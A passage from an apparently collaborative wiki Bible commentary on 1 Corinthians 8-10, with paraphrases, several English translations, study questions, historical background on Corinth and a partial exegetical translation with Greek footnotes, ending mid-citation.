&lt;sup&gt;9&lt;/sup&gt;Be careful, however, that the exercise of your freedom does not become a stumbling block to the weak. &lt;sup&gt;10&lt;/sup&gt;For if anyone with a weak conscience sees you who have this knowledge eating in an idol's temple, won't he be emboldened to eat what has been sacrificed to idols? &lt;sup&gt;11&lt;/sup&gt;So this weak brother, for whom Christ died, is destroyed by your knowledge. &lt;sup&gt;12&lt;/sup&gt;When you sin against your brothers in this way and wound their weak conscience, you sin against Christ. &lt;sup&gt;13&lt;/sup&gt;Therefore, if what I eat causes my brother to fall into sin, I will never eat meat again, so that I will not cause him to fall.}}

==Explanation==

===Paraphrase===	
1 Introduces the matter of food sacrificed to idols: everyone possess knowledge. Knowledge puffs up people; it makes people arrogant, it makes their ego bigger.  Not everyone possesses love and love builds up oneself and others. 2 Someone who thinks they know something actually does not know anything because they do not have the knowledge of what they should know.  What they should know is God but they are blinded by the knowledge of this world.  3 A man who loves God is known by God.  God is love and recognizes those who love him.

4 Introduces the matter of eating food sacrificed to idols: An idol has no meaning in the world but on the other hand, there is only one God. 5 There could be so-called gods because there are many “gods” and many “lords”, they could be in heaven or they could be on earth. There are many “gods” and many “lords” for non-Christians. 6 But for Christians there is only one God, who is the Father, and he creates all things and we live for God. There is only one Lord for Christians, he is Jesus Christ, and through Jesus Christ we are able to live.  We live through Christ, because he died on the cross for the sins of the world.  People find spiritual life in Christ.

7 Not everyone knows that there is only one God and that through Jesus Christ we are able to live. There are people who eat food sacrificed to idols and that is all that they can think about is that it was sacrificed to idols, so their conscious is weakened more, and are impure.  8 Food does not bring us closer to God nor does it push us further away from God; we are no worse if we don’t eat food that is sacrificed to idols, and we are no better if we do eat food sacrificed to idols.

9 Be careful when you eat food sacrificed to idols so that when you eat this is not a stumbling block to others who are weak. A Christian’s practices should not make another fall in their faith. 10 If anyone, who has a weak conscious, sees you eating food sacrificed to idols in the idol’s temple and knows that you have the knowledge that there is only one God; he is encouraged by your doing to eat the same food. 11 This weak young brother in Christ is now destroyed by your knowledge.  12 Therefore when you sin against your brother in this way and weaken their conscious more, you sin against Christ. 13 If eating sacrificed food to idols causes your brother to sin, then do not eat that food anymore.

'''1 Corinthians 8 (New International Version)

Food Sacrificed to Idols''' 

1Now about food sacrificed to idols: We know that we all possess knowledge.[a] Knowledge puffs up, but love builds up. 2The man who thinks he knows something does not yet know as he ought to know. 3But the man who loves God is known by God. 

4So then, about eating food sacrificed to idols: We know that an idol is nothing at all in the world and that there is no God but one. 5For even if there are so-called gods, whether in heaven or on earth (as indeed there are many &quot;gods&quot; and many &quot;lords&quot;), 6yet for us there is but one God, the Father, from whom all things came and for whom we live; and there is but one Lord, Jesus Christ, through whom all things came and through whom we live. 

7But not everyone knows this. Some people are still so accustomed to idols that when they eat such food they think of it as having been sacrificed to an idol, and since their conscience is weak, it is defiled. 8But food does not bring us near to God; we are no worse if we do not eat, and no better if we do. 

9Be careful, however, that the exercise of your freedom does not become a stumbling block to the weak. 10For if anyone with a weak conscience sees you who have this knowledge eating in an idol's temple, won't he be emboldened to eat what has been sacrificed to idols? 11So this weak brother, for whom Christ died, is destroyed by your knowledge. 12When you sin against your brothers in this way and wound their weak conscience, you sin against Christ. 13Therefore, if what I eat causes my brother to fall into sin, I will never eat meat again, so that I will not cause him to fall.

'''1 Corinthians 8 (The Message)

Freedom with Responsibility'''

1-3The question keeps coming up regarding meat that has been offered up to an idol: Should you attend meals where such meat is served, or not? We sometimes tend to think we know all we need to know to answer these kinds of questions—but sometimes our humble hearts can help us more than our proud minds. We never really know enough until we recognize that God alone knows it all. 

4-6Some people say, quite rightly, that idols have no actual existence, that there's nothing to them, that there is no God other than our one God, that no matter how many of these so-called gods are named and worshiped they still don't add up to anything but a tall story. They say—again, quite rightly—that there is only one God the Father, that everything comes from him, and that he wants us to live for him. Also, they say that there is only one Master—Jesus the Messiah—and that everything is for his sake, including us. Yes. It's true. 

7In strict logic, then, nothing happened to the meat when it was offered up to an idol. It's just like any other meat. I know that, and you know that. But knowing isn't everything. If it becomes everything, some people end up as know-it-alls who treat others as know-nothings. Real knowledge isn't that insensitive. 
We need to be sensitive to the fact that we're not all at the same level of understanding in this. Some of you have spent your entire lives eating &quot;idol meat,&quot; and are sure that there's something bad in the meat that then becomes something bad inside of you. An imagination and conscience shaped under those conditions isn't going to change overnight. 

8-9But fortunately God doesn't grade us on our diet. We're neither commended when we clean our plate nor reprimanded when we just can't stomach it. But God does care when you use your freedom carelessly in a way that leads a fellow believer still vulnerable to those old associations to be thrown off track. 

10For instance, say you flaunt your freedom by going to a banquet thrown in honor of idols, where the main course is meat sacrificed to idols. Isn't there great danger if someone still struggling over this issue, someone who looks up to you as knowledgeable and mature, sees you go into that banquet? The danger is that he will become terribly confused—maybe even to the point of getting mixed up himself in what his conscience tells him is wrong. 

11-13Christ gave up his life for that person. Wouldn't you at least be willing to give up going to dinner for him—because, as you say, it doesn't really make any difference? But it does make a difference if you hurt your friend terribly, risking his eternal ruin! When you hurt your friend, you hurt Christ. A free meal here and there isn't worth it at the cost of even one of these &quot;weak ones.&quot; So, never go to these idol-tainted meals if there's any chance it will trip up one of your brothers or sisters. 

'''1 Corinthians 8 (New King James Version)

Be Sensitive to Conscience'''

1 Now concerning things offered to idols: We know that we all have knowledge. Knowledge puffs up, but love edifies. 2 And if anyone thinks that he knows anything, he knows nothing yet as he ought to know. 3 But if anyone loves God, this one is known by Him.

4 Therefore concerning the eating of things offered to idols, we know that an idol is nothing in the world, and that there is no other God but one. 5 For even if there are so-called gods, whether in heaven or on earth (as there are many gods and many lords), 6 yet for us there is one God, the Father, of whom are all things, and we for Him; and one Lord Jesus Christ, through whom are all things, and through whom we live.

7 However, there is not in everyone that knowledge; for some, with consciousness of the idol, until now eat it as a thing offered to an idol; and their conscience, being weak, is defiled. 8 But food does not commend us to God; for neither if we eat are we the better, nor if we do not eat are we the worse. 

9 But beware lest somehow this liberty of yours become a stumbling block to those who are weak. 10 For if anyone sees you who have knowledge eating in an idol’s temple, will not the conscience of him who is weak be emboldened to eat those things offered to idols? 11 And because of your knowledge shall the weak brother perish, for whom Christ died? 12 But when you thus sin against the brethren, and wound their weak conscience, you sin against Christ. 13 Therefore, if food makes my brother stumble, I will never again eat meat, lest I make my brother stumble.

===Observations===

1) What kind of knowledge does everyone possess?

2) If it is worldly knowledge that people possesses, then knowledge makes someone arrogant and makes them proud.

3) If it is heavenly knowledge that people possess, then this knowledge is love and it builds up other people.

4) When we love God, then we are known by God but love doesn’t stop there; people who love God show love to other people so 
that they model God.

5) The “we” mentioned in verse 4 is referring to the Corinthian Christians.

6) Why does Paul follow verse 4 in verse 5 with “For even if there are so-called gods…”? Is it because there were many gods in Corinth and he is just referring back to them to make a point? 

7) Is God the Father and Lord Jesus Christ one?

8) Since God created all things including humans, we are supposed to live for Him; but we have a choice to live for him or not to live for him, a choice to live in love or to live in pride.
9) Not everyone knows that God the Father and Lord Jesus Christ is the one true God, and that is why there are idols. 

10) What are some reasons that some believers have a weak conscience?
a. The Commandments: have no other gods before me.
b. The fear of loosing faith in God.
c. These weak conscience people could know they have a weak conscience and so they have the fear of slipping into temptation.
d. The food is sacrificed to idols so they don’t understand that eating or not eating this food doesn’t make you closer or further away from God.

11) How is eating sacrificed food a freedom?

12) This isn’t just applying to food.  This applies to all aspects of life.  Christians need to build one another up not tear each other down; so if doing something that could tempt a fellow Christian to sin, do not do what ever it is around that person or don’t just do it period because you never know who is watching.

13) Will he really be destroyed or is Paul talking about the person’s faith being weakened?

14) So as Christians we need to be careful in how we use the knowledge of our freedom in Christ Jesus to build fellow Christians up instead of destroying their faith.

15) Our goal is to help people find life in God not find sin.


==Background Information==

===Historical Context===

1 Corinthians is a private letter written by Paul to the Corithians Church. Paul’s writing in this letter was informal (Garland, 19).  It was written from Ephesus probably before the Pentecost in 54 A.D. or 55 A.D.  The purpose of 1 Corinthians was to be a substitute for his absence which encouraged them to change their behavior to one that glorifies God but it was also written as a warning (Garrand, 13-14).  1 Corinthians chapter 8 is the start of the dispute of food sacrificed to idols; this topic continues to chapter 11 verse 1.  The problem was not just of eating food sacrificed to idols but was that this problem could lead to idolatry.  
Garland’s Structure to 1 Corinthians 8:

The dispute of food sacrificed to idols
A. Introduction to the issue of idol food (8:1-6)
B. Refutation of their practice because of its danger to fellow Christians (8:7-13)
      
The city of Corinth was heavily influenced by the Roman cultural values (Garland, 3).  Corinth was a materialistic society, “the value which others place on one’s goods and achievements” (Garland, 4).  The church in Corinth did not have a temple of any sort, instead they met in private homes at night, and partook of the body and blood of Jesus Christ (Garland, 10).  This materialistic society had an effect on the attitude of the Christian church; wealthy members of the church started to compete for followers, and the ones who held worship in their households had a lot influence on fellow members (Garland, 6).  The church of Corinth didn’t seem to be alienated socially and this could be because the church was still living by the secular culture.  “The problem was not that the church was in Corinth but that too much of Corinth was in the church” (Garland, 6).
      
The major religious influence in Corinth was the imperial cult, and because of how the society worked, it was hard for the Corinthians to not be involved in other religious practices (Garland).  Social gatherings normally always had a religious event taking place, and members of the church could have received invitations to banquets at a temple (Garland, 348; Conzelmann, 147).  Garland calls Corinth a religious melting pot.  A problem that occurred in Corinth with religious was that the Roman officials didn’t police private associations but they were upset when a religious action disturbed the peace and security of Corinth (Garland, 9).

===Literary Context===

1 Corinthians chapter 8 deals with the dispute of food sacrificed to idols.  It discusses whether or not “strong” conscience Christians should eat or be involved with food sacrificed to idols because their actions are going to influence the “weak” conscience Christians.  The strong conscience Christians were leading the weak conscience Christians into sin because the weak did not understand that God is the only opinion that matters.  Eating or not eating food sacrificed to idols does not make a person better or less important in the eyes of God; this is what the weak did not understand.  They ate idol food but were not yet fully convinced that this was permissible (Garland, 351).  Paul strongly objected to the strong eating sacrificed idol food when there was a situation in which the weak could stumble, so he instructed the strong to restrict their freedom because of their bonds with their fellow Christians who are weak (Garland, 351).  Not eating food sacrificed to idols to help the weak out is a way of showing love that is the knowledge talked about right at the beginning of Chapter 8 ( Conzelmann, 138).  
	
In talking about knowledge, Paul mentions that all have knowledge; and that “all” is referring to the strong and the weak to show that there is an equal standing (Conzelmann, 140).  Next he says that not all have knowledge (Conzelmann, 140).  There is a difference between worldly knowledge and heavenly knowledge and some of worldly knowledge while others have heavenly knowledge and vice versa.  The Corinthians’ knowledge is not sufficient even in the realm of objective statement; the formal knowledge of the fact that there is one God is not yet insight into the truth about the powers of the world (Conzelmann, 143).  
	
In discussion of the “weak” and the “strong”, this is just referring to the state of a person’s conscience.  The situation of the “weakness” of some people’s consciences creates a problem that neither the weak nor the strong can ignore (Conzelmann, 147).  The strong cannot ignore the problem because their freedom could cause the weak to stumble in sin and the weak cannot ignore it because they need their consciences to grow stronger.  The “weak” does not represent a position in society or class, it just simply means that a person has a weak conscience (Conzelmann, 147).

==Implications==

===Reception===

The original audience was the people in the church of Corinth.  It was mainly written to the Christians with strong consciences because they were the ones who had an impact on the weak conscience Christians in the church.  It still applies to strong conscience Christians in the same way.  

===Influence===

The problem then was that Corinthian Christians were engaging in eating of food sacrificed to idols and this was controversial in that time.  Eating of this food was viewed as idolatry and pagan sacrifices permeated all levels of Greek and Roman society (Gaebelein).  But eating idol sacrificed food was hard to avoid because meat offered at pagan alters were divided up between the priest, offerer, and the sacrifice; but if the priest did not use his portion the meat ended up in the public market (Gaebelein).
      
Verses one through three talk about knowledge and love, everyone has knowledge but not everyone has love.  Paul insists that what really matters is love, which builds up the community (Hays).  Verses four through six discuss the meaning of eating meat sacrificed to idols.  Idols have no meaning and whether you eat sacrificed food or not does not bring you closer to God or further away from God.  Verses seven through thirteen deal with freedom to be exercised with care.  Not everyone has the knowledge talked about in verses one through three so Christians need to be careful how, where, and when they exercise their freedom because they may lead people to sin.  Gaebelein sums it up: “Speaking to the “strong” brother in verse twelve, Paul is saying, ‘If you cause the weak brothers to stumble into sin, you yourselves are sinning in a twofold way: (1) against your brothers and (2) against Christ in that you are wounding the conscience of those who belong to Christ.’”  The knowledge Paul now speaks of is the perceptive knowledge regarding an idol and the existence and position of the “so-called gods” (Gaebelein).

&lt;sup&gt;1&lt;/sup&gt;Am I not free? Am I not an apostle? Have I not seen Jesus our Lord? Are you not the result of my work in the Lord? &lt;sup&gt;2&lt;/sup&gt;Even though I may not be an apostle to others, surely I am to you! For you are the seal of my apostleship in the Lord. 
&lt;sup&gt;3&lt;/sup&gt;This is my defense to those who sit in judgment on me. &lt;sup&gt;4&lt;/sup&gt;Don't we have the right to food and drink? &lt;sup&gt;5&lt;/sup&gt;Don't we have the right to take a believing wife along with us, as do the other apostles and the Lord's brothers and Cephas? &lt;sup&gt;6&lt;/sup&gt;Or is it only I and Barnabas who must work for a living? 

&lt;sup&gt;7&lt;/sup&gt;Who serves as a soldier at his own expense? Who plants a vineyard and does not eat of its grapes? Who tends a flock and does not drink of the milk? &lt;sup&gt;8&lt;/sup&gt;Do I say this merely from a human point of view? Doesn't the Law say the same thing? &lt;sup&gt;9&lt;/sup&gt;For it is written in the Law of Moses: &quot;Do not muzzle an ox while it is treading out the grain.&quot; Is it about oxen that God is concerned? &lt;sup&gt;10&lt;/sup&gt;Surely he says this for us, doesn't he? Yes, this was written for us, because when the plowman plows and the thresher threshes, they ought to do so in the hope of sharing in the harvest. &lt;sup&gt;11&lt;/sup&gt;If we have sown spiritual seed among you, is it too much if we reap a material harvest from you? &lt;sup&gt;12&lt;/sup&gt;If others have this right of support from you, shouldn't we have it all the more? 

&lt;sup&gt;13&lt;/sup&gt;But we did not use this right. On the contrary, we put up with anything rather than hinder the gospel of Christ. 13Don't you know that those who work in the temple get their food from the temple, and those who serve at the altar share in what is offered on the altar? &lt;sup&gt;14&lt;/sup&gt;In the same way, the Lord has commanded that those who preach the gospel should receive their living from the gospel. 

&lt;sup&gt;15&lt;/sup&gt;But I have not used any of these rights. And I am not writing this in the hope that you will do such things for me. I would rather die than have anyone deprive me of this boast. &lt;sup&gt;16&lt;/sup&gt;Yet when I preach the gospel, I cannot boast, for I am compelled to preach. Woe to me if I do not preach the gospel! &lt;sup&gt;17&lt;/sup&gt;If I preach voluntarily, I have a reward; if not voluntarily, I am simply discharging the trust committed to me. &lt;sup&gt;18&lt;/sup&gt;What then is my reward? Just this: that in preaching the gospel I may offer it free of charge, and so not make use of my rights in preaching it. 

&lt;sup&gt;19&lt;/sup&gt;Though I am free and belong to no man, I make myself a slave to everyone, to win as many as possible. &lt;sup&gt;20&lt;/sup&gt;To the Jews I became like a Jew, to win the Jews. To those under the law I became like one under the law (though I myself am not under the law), so as to win those under the law. &lt;sup&gt;21&lt;/sup&gt;To those not having the law I became like one not having the law (though I am not free from God's law but am under Christ's law), so as to win those not having the law. &lt;sup&gt;22&lt;/sup&gt;To the weak I became weak, to win the weak. I have become all things to all men so that by all possible means I might save some. &lt;sup&gt;23&lt;/sup&gt;I do all this for the sake of the gospel, that I may share in its blessings. 

&lt;sup&gt;24&lt;/sup&gt;Do you not know that in a race all the runners run, but only one gets the prize? Run in such a way as to get the prize. 

&lt;sup&gt;25&lt;/sup&gt;Everyone who competes in the games goes into strict training. They do it to get a crown that will not last; but we do it to get a crown that will last forever. &lt;sup&gt;26&lt;/sup&gt;Therefore I do not run like a man running aimlessly; I do not fight like a man beating the air. &lt;sup&gt;27&lt;/sup&gt;No, I beat my body and make it my slave so that after I have preached to others, I myself will not be disqualified for the prize.}}

== First Thoughts ==

When first reading over this, one may assume Paul is becoming very angry at his audience.  He comes off as trying very hard to defend himself, maybe because of the judgment he is facing or for whatever other reason.  It seems that he may be slightly contradicting himself, but as you read further into it, you may begin to realize what he is really trying to accomplish with this.  


== Questions ==

1. Why is he so frustrated?


2. Why does he have to use so many examples?


3. Is Paul for or against getting support from the church?


4. What are Paul’s intentions with this letter?


5. What does Barnabas have to do with this?


6. Why does he use the imagery of a runner?


7. How does Paul view serving the Lord?


8. Are there deeper meanings to some of the examples he uses?


9. Does he think that receiving support from the church is bad?


10. What are Paul’s passions in his ministry?


11. Do these passions get in the way of his goal?


== Historical Background ==

To understand the people that Paul was writing to, one must first have a better understanding where these people were from. 

 
Corinth was a city on the Gulf of Saros.  This was a very popular stopping spot for captains and those looking to sell items.  Corinth was the most wealthy and most important city at that time in Greece.  It was the capital of Achaia, a Roman province, and its population was estimated as high as 600,000.  There was a market place in the center of the city where the temple of Apollo stood, which is still the most well-known ruin from that time. (Craig, 3-4)

1 Am I not allowed to speak out?  Am I not the one who has seen our Lord?  Are you not the result of what I have done for the Lord? 2 Even though I am not everyone’s apostle, I am to you!  You are the reason I work for the Lord.


3 This is what I have to say to those who judge me. 4 Don’t we all have the right to eat and drink?  5 Don’t we all have the right to take a wife with us, as do others we have known?  6 Or is it only Barnabas and me who have to work for our living?


7 Who serves as a soldier at the cost of his own life?  Who plants gardens and does not eat what they grow?  Who tends to a flock and does not drink the milk they get?  8 I do not only say this from a human point of view.  Doesn’t the law say the same thing?  9 The Law of Moses states: &quot;Do not muzzle an ox while it is treading out the grain.”  Is it the oxen that God is worried about?  10 He says the same for us, don’t you think?  Yes, this was written for us, because when they each do a part of the work, they do it hoping they will share the harvest.  12 If you work on the harvest, shouldn’t you get some of it?


We did not do this right.  We did whatever needed rather than hindering the gospel of Christ.  13 Did you know that those who eat at the temple get their food from there, and those who serve at the alter share what is offered there?  14 In the same way, the Lord commanded us to share his word so that we may get something out of it.


15 But I have not received any of these rights.  I am not writing this as a hint that I want them.  I would rather die than have someone take away this joy of doing it for free.  16 When I preach, I do not boast, because I am obligated to.  That would be bad on my part if I did not preach.  17 If I preach voluntarily, I have a reward; if not voluntarily, I will lose this trust given of me.  18 What is my reward then?  It is that I offer my preaching free, and that I have given up all my rights to preach it.


19 I am free, but I am a slave to others, so I may win as many as possible.  20 To the Jews I became like them, to win them.  TO those under the law I became like the to win them.  21 To those without the law I became like them to win them.  22 I became like the weak to win the weak.  I have become all these to try and save as many as I can.  23 I do all this for the sake of the gospel, but also so I may receive its blessings also.


24 Runners race to win the prize.  We should run like this, hoping to receive the prize.  25 Those who are runners have to train.  Their prize is not one that will last, but we run the race to win a crown that will last forever.  26 Because of this, I do not run like a man without discipline.  27 I give it everything I have so that I may be an example to others, and so I will not lose the joy of the prize.

== Word Study ==

Vs. 1 Apostle- The Greek word for this is “apostolos” meaning “sent out one”.


Vs. 15 Boast(NIV), Glorying(KJV)- This is not meant to come off as having a big ego.  It is a conviction Paul has felt.  The Greek term for glorying (kauchema) means “joyous feeling of the moral worth of one’s own actions.” (Metz, 399-400)


Vs. 19 Gain(KJV), Win(NIV)- This is a word commonly used by missionaries.  The Greek word for it is “kerdaino”, which usually means to gain.  This sounds more like gaining possessions, so when used to “gain people” it makes more sense to use the word “win”. (Earle, 60)

== Commentary ==

(9:1) Paul lists off all these questions as to what rights he had as an apostle.   He asked questions in which the answers are known, but he did it in a way so he could share more about what it means to be an apostle.  Just because he is an apostle does not mean that he loses all his rights as a human.  Some of the questions look to the past and some forward. (Interpreter’s Bible, 98)  He shares that he is not controlled by these laws.  He has freedom.  This freedom he has though is much greater than most because he is an apostle.  He has many privileges because he is an apostle. (Metz, 395)


(9:2) Paul is showing those who do not believe in him being an apostle why he is and who he is helping.  He explains to them that he is an apostle for them, even if not for everyone else, they are the reason for his apostleship.  Paul uses the word “seal”.  This means that he is “connected with the gift of the Spirit.” (Craig, 98-99)


(9:3) Paul uses the word “defense” here.  This could mean that he was being attacked about his apostleship.  People did not believe that he was a real apostle because he did not take the support given by the church. (Craig, 99)


(9:4) Even though Paul turned down support from the church does not mean that he does not have the right to eat what is served.  It is because of his dedication that he turns this down. (Metz, 396)


(9:5) Paul was using another example of a right that he had as an apostle.  He had the right to have a wife come along with him. 
(9:6) Work is the big issue in this verse.  Paul is referring to manual labor.  Because Paul is making his own money and trying to make a living without the churches support, he has to do a lot of manual labor, which the Greeks did not agree with.  Greek philosophers thought of these men who do manual labor to be worth less than people like businessmen and soldiers. (Metz, 397)

(9:7-8) All of these questions are rhetorical.  Paul is again defending himself as an apostle.  In all three of these scenarios, the person has to live off of what they provide.  A soldier has to fight with what he is given, a man who plants a vineyard receives his portion it, and a shepherd lives off of what he raises.  Paul is giving example that relate to him.  He is showing that you should be able to live off of your own work if you chose. (Metz, 397)


(9:9-12) The law says that you should not muzzle an ox.  Jews thought of these animals as God’s creation so they deserved to be treated in a humane way.  They have a reward through the grain they were allowed to eat.  Paul compares this to the work of the apostles.  Why should they not be able to benefit from what they have done? (Metz, 398) (Craig, 101-102)


(9:13-14) Paul is comparing his work to a Priest, but not saying he is like a Priest.  He is showing how they would get a lot of support from the church.  If you are going around sharing the gospel, then you should be getting help from it.  You should not have to do work without pay. (Metz, 398-399) (Craig, 102)


(9:15-18) Paul has not accepted any of the support given him by the church, and he did not write this letter to try and get money from them.  He says that he would rather die than to accept what they were giving him.  He really just wants to preach to them for free.  He states that he does not deserve the credit they are giving him.  He is not an apostle to be paid and recognized for his work.  If you are called to do something and you go, you do not need or deserve the credit that they are trying to give you.  He is doing this out of self sacrifice. (Metz, 400) (Craig, 102-103)


(9:19-22) Paul gave up all of himself to serve the Lord.  He understood that to reach these people he had to put aside his thoughts and disregard what they thought of him and try to understand them better.  How can you preach to someone if you do not know who they are?  It meant more to him to try and win them to Christ than to try and fight with them over their thoughts of him. (Metz, 402)
(9:23) Paul had reasons why he thought of ministry like this.  He did this not only to share the gospel with others, but also so he might have the experience of living his life fully for Christ. (Metz, 402)


(9:24-27) Paul uses an image that most people could relate to or at least understand.  Athletics were well known in that time.  He uses a runner for an example.  Runners have to have a lot of discipline and motivation.  Their motivation is the prize for winning the race.  Paul says that we should all be living like we are in a race to win a prize.  Then he compares that small prize to what would really be the prize.  The crown will last forever, but the earthly prize only lasts for a small amount of time.  The only one that can hold you back is yourself.   Paul also says that it would be very disappointing if you were telling others how to run this race, but did not make it yourself.   Discipline is a big part of running this race for Christ. (Metz, 402-403) (Craig, 105-106)


== Intentions ==

Paul’s intention in writing this was not to try and receive money or any of the other rights he previously talked about.  He was not planning on changing the purpose of his letter.  Paul was adamant about making his own living and not getting support from the church, to the extent that he would rather die than accept help. (vs. 15)  He does not want to receive any credit for the things he is doing because he believes he does not deserve them. (vs. 16)  Paul’s intention with this letter is to share what he is doing and why he is doing it.  He feels called by God and is not only preaching the gospel so others may receive the prize, but also so he will not miss out on it. (Metz, 399-400)

== Final Thoughts: How to apply it to today ==


Paul set a very good example for us in this letter.  He stands up for what he is doing.  He knows that he has the same rights as anyone else then, but he sacrifices everything to serve Christ as he was called to do.  Why should he be recognized for something he is called to do?  He turns down all support from the church so he can provide for himself.  His reward is seeing all the people that are now living for Christ and through this he will receive the final prize too because he is living how God has called him to.  He recognizes that he cannot be preaching these things and not be practicing them himself.  What good would that do?  


Paul also sets an example of how to truly reach out to people and set an example.  First is through practicing what he preaches, but also through relationships.  He lives among these different groups and gets to know them and has a better understanding of who they are and their ways of doing things.  Through this he has a better understanding of how to witness to them and share.  He does not let their comments bother him and pushes on towards winning these others to Christ.  He wants everyone to share in this joy of living for Christ and receiving the final prize.  


We can apply this to our lives today in many ways.  God has called all of us to serve Him and to help more people find joy in Him.  How can people see this if those who are witnessing to them are still living the way they are?  Why should we take all the credit for something that we are called to do?  We are living for Christ not only to be an example for others, but also to receive our prize that we have worked so long for.

      <text xml:space="preserve">==Paraphrase vs. 23-33==
Everything is allowed, but not everything is helpful or constructive.  Nobody should seek their own good, but instead good for others.  Eat whatever is sold at the butchery and don’t worry where it came from since all things came from God’s earth.
If a non-Christian has you over for dinner and you want to go, don’t be a bad guest and not accept what the host is offering.  However if someone specifically says, “This has been offered in sacrifice” don’t eat it for both you sake and theirs.  Specifically theirs since they are not open-minded enough to see its spiritual unimportance. No matter what you eat or drink, don’t let others condemn you for thanking God for your meal.
So when you have a meal, eat it for the glory of God, this includes not causing offence to other people with other beliefs.  Just as I (Paul) try to not upset others, you too should try and consider other so that they may become saved.

==Verse by Verse Commentary==

===Verse 23===
Paul begins the last section of Corinthians chapter 10 with a reminder to the church that “Everything is permissible”  The wording of this verse is almost identical to earlier in Corinthians at 6:12. While the context in chapter 6 was specifically sexual impurities, the specific meaning of this phrase in both sections is that humans have free will.  Saying that “everything is permissible” isn’t specifically in reference to any social or even religions permissibility, but instead a general idea of choice, Paul received most of the wording for this understanding from preexisting Greek philosophical texts.  Paul continued with the general language of the Greek philosophers and continues to say that while things are permissible they may not be beneficial or constructive.   The Greek teachers of the age would use a scale of usefulness to see if actions were worth undertaking.  Paul adopts this philosophy and applies to more specifically to Christianity.

===Verse 24===
Paul finishes his general philosophical call with a reiteration of the golden rule; however he specifically puts the emphasis on the good for others.  This call towards a life of selflessness can be understood as one of the (if not thee) driving principles of Jesus’ ministry.  Verses 23 and 24 are set up as prerequisites for the rest of the chapter as they remind Christian’s of their opportunity for choice, and their necessity make that choice love.

===Verse 25===
the passage becomes more centralized as we quickly learn that this section deals with the consumption of different foods and drinks, especially those that were used in pagan sacrifices. To understand this verse you must have some understanding of the historical context that lies behind it.  Judaism and Christianity are not the sole religious systems found near the Mediterranean Sea, and in fact once you move past Israel and into Grease you find that cities like Corinth have a large pagan population.  One chief aspect of these traditions is the sacrificing of animals to their gods.  While most of the food went to the local prophets or their own family, some would end up back at the market place.  The worry that some first century Christians had was that they would inadvertently eat food previously offered to another pagan god.   Paul is writing here to ease those with this concern by telling them that ignorance is bliss, if they are unaware of the foods origins, eat it without raising questions of conscience.

===Verse 26===
Paul backs up his claim in verse 25 by reminding the Christians in Corinth that “The earth is the Lord’s.”  This comes directly from Psalm 24:1 which states the glory of God and God’s creation.  Just as in Peter’s account with God and the sheet of unclean food.  Paul is writing to remind his readers that everything on earth is from God, so everything must be good.

===Verse 27===
Verse 27 through 29 state the importance of social obligations by Christians to non-Christians.  Just as we see in Luke 11:37, Jesus hoped to break down the societal barrier that caused this divided as he regularly ate with Pharisees and tax collectors.  Paul continues this new tradition by telling those in Corinth to eat with non-believers and more specifically to be respectable guest at the same time by not questioning or denying everything put before you.

===Verses 28 &amp; 29===
these next verses are for the most part summarized versions of 1 Corinthians 8:7-13. They address the question of what to do if another weaker Christian brother or sister notices that the food was offered to idols and feels it unclean to eat.  As the stronger follower of Christ, you understand that eating the offered food has no spiritual implications; however you must respect the beliefs and short comings of your weaker friend and not partake in the food for their sake.  This does however raise a few questions from the text.  when and how do you inform the weaker brother of his misunderstanding, and also who does Paul have in mind when wiring this letter since it seems that only the “strong” Christians will be reading it. 

===Verse 30===
Giving thanks for meals is a tradition that can be traced far back into Jewish heritage, alive in first centaury Christians (Romans 14:6) and can still be seen today in almost all forms of Christianity.  Paul reemphasizes the importance of being grateful for having food and unimportance of were that food came from, he states, “Why am I denounced because of something I thank God for?


===Verses 31 &amp; 32===
from verse 31 to 33 we find a summary of Paul’s thoughts on what is important to think about in regards to food and drink.  Paul states another central theme of the New and Old Testament (Deut. 6:4-5, Psalm 63:1) with the call to, ”do it all for the glory of God.”  However right after this he retouches his second point that we should “not cause anyone to stumble” including those within and apart from the Church of God.

===Verse 33===
Paul ends with the same plea for Christians that he begins with, to seek the good of many over your own good.  The last line explains “so that they may be saved.”  This passage in scripture is undeniably a call for Christians to not become overly concerned with trivial maters of practice, and instead focus on the greater goal of loving others and bringing people to Christ.  It forces us to question how well Christians have been able to accomplish this task over the centuries, and what must still be done.

===Exegetical Translation from the Greek Text===

&lt;blockquote&gt;
'''1''' Now I would like to remind you, brothers and sisters,{{#tag:ref|The Greek word αδελφοί technically means &quot;brothers.&quot; However, it is frequently used generically in the plural (as it is here) in Greek literature to refer to a mixed-gender group of &quot;siblings.&quot; Indeed, in the plural especially, the word often is used to refer to all close family members.&lt;ref&gt;Günther, Walther. &quot;Αδελφός.&quot; ''The New International Dictionary of New Testament Theology.'' Colin Brown, Ed. Version 2.0. (Grand Rapids: Zondervan, 1986). ''Accordance Bible Software.'' OakTree Software, inc. Version 8.2.2, March 2009.&lt;/ref&gt; Thus, because there are no indicators that the passage is only addressed to males, including &quot;sisters&quot; with brothers is well supported.|group=&quot;tn&quot;}} of the very Gospel--the Good News--{{#tag:ref|This is an attempt to render a phrase into English from the Greek that is very difficult to translate the important nuances: ευαγγέλιον ό ευηγγελισάμην. As can be easily seen in this even without knowing the meaning of the words, the verb (ευηγγελισάμην) and the direct object (ευαγγέλιον) share a redundant root. Translated most literally, the phrase says &quot;the gospel that I proclaimed the gospel to you&quot;--which is indeed bad English--or, perhaps one could wordsmith as Paul so often does, and translate it as &quot;the gospel that I 'gospelled' to you.&quot; Many translations simply say &quot;the gospel that I proclaimed to you&quot; (NRSV) or &quot;that I preached to you&quot; (NIV, ESV, NASB) but this does not pick up the full potency of Paul's emphasis. Paul could have used a different verb for &quot;preach,&quot; such as κήρυσσω (which would have voided such redundancy) and so it is likely that such redundancy of the root word is intended for special emphasis. Thus, in this translation, &quot;the very Gospel--the good news--...&quot; emphasizes both the redundancy for emphasis and also the fact that the Good News is passed on--not just a story that Paul created. In the context of this section, the reality of the message is of chief importance to Paul, as he is laying a foundation for all the sections that follow.|group=&quot;tn&quot;}} that I brought to you as a messenger,{{#tag:ref|While most all translations translate the verb ευηγγελισάμην as &quot;preached&quot; or &quot;proclaimed&quot;, these translations could imply that the Corinthians could have received a unique articulation of the message by Paul as an act of contextualized preaching. But Paul's point in this section is instead to point to something he is ''handing on'' from those that came before him. He cites a church creed beginning in '''verse three''' that was not specific to the Corinthian church, but rather universal to the whole church. Furthermore, as opposed to κήρυσσω (also meaning &quot;preach or proclaim&quot;), which emphasizes the act of speaking, ευηγγελισάμην emphasizes the act of carrying a message to somebody--in this case, the Good Message. This can be understood from the root of the word, άγγελος (meaning &quot;messenger&quot;)&lt;ref&gt;Danker, Frederick William, et al. ''A Greek-English Lexicon of the New Testament and other Early Christian Literature.'' Third Edition. Version 